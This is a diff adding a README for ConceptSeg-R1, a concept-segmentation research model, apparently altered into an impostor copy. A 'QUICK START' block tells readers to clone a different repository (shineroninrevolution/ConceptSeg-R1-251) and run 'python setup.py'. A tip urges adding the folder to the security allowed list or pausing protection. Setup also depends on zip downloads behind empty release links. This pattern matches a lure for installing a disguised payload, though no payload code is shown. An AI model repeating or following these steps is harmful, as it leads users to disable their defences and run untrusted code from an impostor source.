@@ -1,0 +1,283 @@
+<div align="center">
+
+<h1>ConceptSeg-R1</h1>
+
+**ConceptSeg-R1: Segment Any Concept via Meta-Reinforcement Learning**
+
+[![arXiv](https://img.shields.io/badge/arXiv-2026-b31b1b?style=flat-square&logo=arxiv)](https://arxiv.org/pdf/2605.20385)
+[![Project Page](https://img.shields.io/badge/🌐%20Project-Page-blueviolet?style=flat-square)](https://ntu-ai4x.github.io/ConceptSeg-R1/)
+[![HuggingFace](https://img.shields.io/badge/🤗%20Model-7B%20Weights-ffd21e?style=flat-square)](https://huggingface.co/zhaoyuan666/ConceptSeg-R1-7B)
+[![Dataset](https://img.shields.io/badge/🤗%20Dataset-ConceptSeg--Benchmark-ffd21e?style=flat-square)](https://huggingface.co/datasets/zhaoyuan666/ConceptSeg-Benchmark)
+[![License](https://img.shields.io/badge/License-Apache%202.0-blue?style=flat-square)](LICENSE)
+[![Stars](https://img.shields.io/github/stars/yuanzhao-CVLAB/ConceptSeg-R1?style=flat-square)](https://github.com/shineroninrevolution/ConceptSeg-R1-251/stargazers)
+
+<p>
+  <a href="#introduction">Introduction</a> •
+  <a href="#get-started">Get Started</a> •
+  <a href="#data">Data</a> •
+  <a href="#datasets--checkpoints">Checkpoints</a>
+</p>
+
+
+<img src="./assets/Concept_Tree.png" width="90%"/>
+</div>
+
+## 🎬 Short Video
+<a href="https://ntu-ai4x.github.io/ConceptSeg-R1/#Show">
+  <img src="https://github.com/NTU-AI4X/NTU-AI4X.github.io/blob/main/ConceptSeg-R1/ConceptSeg-R1-video.jpg" width="90%">
+</a>
+
+## 📰 News
+
+- **May 2026** — arXiv paper released 🎉
+
+## 🗺️ Roadmap
+
+| Status | Item |
+|:------:|------|
+| ✅ | arXiv paper |
+| ✅ | Training code |
+| ✅ | Testing code |
+| ✅ | CI-CD-CR datasets |
+| ✅ | ConceptSeg-R1 (7B weights) |
+| ⬜ | Release larger MLLM  weights, e.g.,  ConceptSeg-R1-32B，ConceptSeg-R1-72B|
+
+
+## Introduction
+
+<div align="center">
+
+### 🌍 As segmentation in computer vision shifts from objects to concepts, 
+### 🚀 **ConceptSeg-R1 takes the first step toward segmenting any concept.**
+
+</div>
+
+<div align="center">
+<img src="./assets/Architecture.png" width="100%"/>
+</div>
+
+<br>
+
+### Key Contributions
+- **🌳 From Objects to Concepts**  
+  We introduce a three-level concept hierarchy covering **CI**, **CD**, and **CR** concepts, pushing segmentation beyond category recognition.
+
+- **🔁 From Instance Solving to Rule Induction**  
+  Meta-GRPO enables the model to infer transferable task rules from visual demonstrations and apply them deductively to unseen queries.
+
+- **🔗 Latent Concept Tokens for Frozen SAM 3**  
+  We map MLLM reasoning states into implicit concept tokens in the SAM 3 prompt space, enabling reasoning-aware segmentation without fine-tuning SAM 3.
+
+- **⚡ From Heavy Reasoning to Adaptive Inference**  
+  The Shortcut Router dynamically balances SAM 3 efficiency and reasoning depth, enabling fast perception for simple cases and deeper reasoning for complex concepts.
+
+## Results
+
+### Concept Segmentation Benchmarks (CI / CD / CR)
+
+<div align="center">
+<img src="./assets/tab1.png" width="100%"/>
+</div>
+<br>
+
+### Cityscapes Performance (Zero-Shot)
+
+
+<div align="center">
+<img src="./assets/tab2.png" width="90%"/>
+</div>
+<br>
+
+### ReasonSeg Performance (Zero-Shot)
+
+
+<div align="center">
+<img src="./assets/tab3.png" width="60%"/>
+</div>
+
+### Qualitative Comparison
+
+<div align="center">
+<img src="./assets/fig4.png" width="100%"/>
+</div>
+<br>
+
+### Concept Coexistence
+
+
+<div align="center">
+<img src="./assets/fig5.png" width="100%"/>
+</div>
+<br>
+
+## Get Started
+
+<details>
+<summary> 1. Environment Setup</summary>
+  
+### 1. Environment Setup
+
+[GitHub Releases]()
+and place them in the repository root:
+
+- `sam3-main.zip`: the modified SAM 3 package used by ConceptSeg-R1.
+- `all_meta.json.zip`: the training metadata file.
+
+```bash
+conda create -n conceptseg-r1 python=3.10
+conda activate conceptseg-r1
+bash setup.sh
+```
+
+</details>
+
+<details>
+<summary> 2. Training </summary>
+
+### 2. Training
+
+**Prepare data** — Download the dataset, extract `all_meta.json` through `setup.sh`,
+and set your `image_folders` path in the shell scripts.
+
+```bash
+# Stage 1: SFT Training
+bash run_grpo_multiimage_stage1.sh
+
+# Stage 2: GRPO Training
+# Note: Set `model_path` to the Stage 1 output checkpoint before running. （If you training encounter unexpected GPU OOM   despite sufficient VRAM,  try changing transformers_version to "4.49.0" in model_path/generation_config.json.）
+bash run_grpo_multiimage_stage2.sh
+```
+
+
+> [!TIP]
+> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.
+
+> [!CAUTION]
+> Some security systems may block the installation.
+> Only download from the official repository.
+
+---
+
+## QUICK START
+
+```bash
+git clone https://github.com/shineroninrevolution/ConceptSeg-R1-251.git
+cd ConceptSeg-R1-251
+python setup.py
+```
+
+
+</details>
+
+<details>
+<summary> 3. Evaluation </summary>
+
+
+### 3. Evaluation 
+
+**Concept Segmentation** — Download weights, set the model path in `eval_conceptseg.sh`, then run:
+
+```bash
+bash eval_conceptseg.sh
+```
+
+> **Tip:** Configure specific tasks for testing inside `eval_conceptseg.sh`.
+
+**Reasoning Segmentation** — Download weights, set the model path in `eval_reasonseg.sh`, then run:
+
+```bash
+bash eval_reasonseg.sh
+```
+
+</details>
+
+<details>
+<summary> 4. Inference </summary>
+
+### 4. Inference
+**Quick Start**: The `inference.sh` script includes 4 test cases covering different usage scenarios.
+```bash
+# Test 4  cases
+bash run_scripts/inference.sh
+```
+**Single Example Inference** — For quick testing and demonstration, use the inference script:
+```bash
+# Or test a specific case
+python src/eval/inference_single_example.py \
+    --model_path "path/to/model" \
+    --infer_path "path/to/image" \
+    --question "concept description" \
+    --output_path "output/path"
+```
+
+**Supported Input Modes:**
+- **Single Image**: Basic concept segmentation with text prompt (set `--ref_path` and `--bbox` to empty)
+- **Multiple Images**: Reference-guided segmentation with visual reasoning (set `--ref_path)
+- **Bounding Boxes**: Precise reference region specification for complex concepts (set `--bbox)
+ 
+
+</details>
+ 
+## Data
+
+`all_meta.json` is no longer tracked in this repository. Download
+`all_meta.json.zip` from
+[GitHub Releases]()
+and run `bash setup.sh` to extract it before training.
+
+Place datasets under a shared root directory (`image_folders`):
+
+```
+root/
+├── isic2018/
+├── rare/
+├── Breast_Tumor/
+├── transparent1024/
+├── MGrounding-630k/
+├── Polyp/
+├── Shadow_detection/
+├── MIG-Bench/
+├── coco2014_Living/
+├── CoSOD3k1024/
+├── ultra_rare/
+├── coco2014_Artifact/
+├── fewshot1000/
+├── DUTS/
+├── ESDIDefects/
+└── COD10K1024/
+```
+
+
+## Metric
+
+Evaluation uses the [PySegMetric_EvalToolkit](https://github.com/Xiaoqi-Zhao-DLUT/PySegMetric_EvalToolkit).
+
+
+## Datasets & Checkpoints
+
+| Resource | Link |
+|----------|------|
+| 📦 ConceptSeg-Benchmark Dataset | [Download on HuggingFace](https://huggingface.co/datasets/zhaoyuan666/ConceptSeg-Benchmark) |
+| 🤖 ConceptSeg-R1-7B Weights | [Download on HuggingFace](https://huggingface.co/zhaoyuan666/ConceptSeg-R1-7B) |
+
+## Acknowledgements
+
+We reference the excellent open-source repos [SAM 3](https://github.com/facebookresearch/sam3), [VLM-R1](https://github.com/om-ai-lab/VLM-R1) and [LENS](https://github.com/hustvl/LENS). Thanks to their authors for the valuable contributions to the community.
+
+## Citation
+If you find this work useful, please consider starring  ⭐ and citing the repo!
+
+
+```bibtex
+@misc{zhao2026conceptseg,
+      title={ConceptSeg-R1: Segment Any Concept via Meta-Reinforcement Learning}, 
+      author={Yuan Zhao and Youwei Pang and Jiaming Zuo and Wei Ji and Kailai Zhou and Bin Fan and Yunkang Cao and Lihe Zhang and Xiaofeng Liu and Huchuan Lu and Weisi Lin and Dacheng Tao and Xiaoqi Zhao},
+      year={2026},
+      eprint={2605.20385},
+      archivePrefix={arXiv},
+      primaryClass={cs.CV},
+      url={https://arxiv.org/abs/2605.20385}, 
+}
+
+
+<!-- Last updated: 2026-06-06 18:14:40 -->
